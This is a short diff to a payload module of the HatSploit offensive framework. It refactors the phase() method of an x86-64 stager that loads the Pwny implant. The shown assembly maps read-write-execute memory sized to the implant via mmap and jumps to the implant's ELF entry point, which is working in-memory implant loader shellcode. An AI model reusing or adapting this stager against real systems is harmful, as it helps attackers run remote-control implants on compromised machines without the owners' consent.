@@ -33,6 +33,10 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
         }
 
     def phase(self):
+        implant = self.implant()
+        length = len(implant)
+        e_entry = self.get_header(implant)['e_entry']
+
         return self.assemble(
             self.details['Architecture'],
             f"""
@@ -42,7 +46,7 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
                 push 0x9
                 pop rax
                 xor rdi, rdi
-                push {hex(len(phase1()))}
+                push {hex(length)}
                 pop rsi
                 push 0x7
                 pop rdx
@@ -75,7 +79,7 @@ class HatSploitPayload(Payload, Pwny, Assembler, ELF):
                 push rcx
                 push 0x2
 
-                push {hex(self.get_header(phase1())['e_entry'])}
+                push {hex(e_entry)}
                 pop rax
                 add rsi, rax
                 jmp rsi
